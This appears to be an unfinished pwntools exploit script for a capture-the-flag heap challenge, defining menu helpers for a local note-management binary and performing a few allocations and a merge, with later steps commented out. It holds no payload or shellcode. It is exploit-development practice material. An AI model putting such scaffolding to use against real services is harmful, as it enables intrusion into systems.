from pwn import *
context.arch='amd64'
r = process('./P',env={"LD_PRELOAD": "./libc.so.6"})

def read_note(idx):
    r.sendlineafter(b'> ',b'1')
    r.sendlineafter(b'page? ',str(idx).encode())


def write_rdonly_note(idx,size,content):
    r.sendlineafter(b'> ',b'2')
    r.sendlineafter(b'page? ',str(idx).encode())
    r.sendlineafter(b'Size? ',str(size).encode())
    r.sendafter(b'Content: \n',content)

def write_rdwr_note(idx,size,content):
    r.sendlineafter(b'> ',b'3') 
    r.sendlineafter(b'page? ',str(idx).encode())
    r.sendlineafter(b'Size? ',str(size).encode())
    r.sendlineafter(b'Content: \n',content)

def rewrite_rdwr_note(idx,content):
    r.sendlineafter(b'> ',b'4')
    r.sendlineafter(b'page? ',str(idx).encode())
    r.sendlineafter(b'Content: \n',content)


def merge_rdonly_note(dst,src):
    r.sendlineafter(b'> ',b'5')
    r.sendlineafter(b'dest? ',str(dst).encode())
    r.sendlineafter(b'src? ',str(src).encode())

def delete_note(idx):
    r.sendlineafter(b'> ',b'6')
    r.sendlineafter(b'page? ',str(idx).encode())

write_rdonly_note(0,0x8,b'1'*0x8)
write_rdwr_note(1,0x18,b'1'*0x17)
merge_rdonly_note(1,0)
# write_rdwr_note(1,0x18,b'1'*0x17)
# write_rdwr_note(2,0xb0,b'1'*0x50)
# merge_rdonly_note(1,0)
# rewrite_rdwr_note(1,)

r.interactive()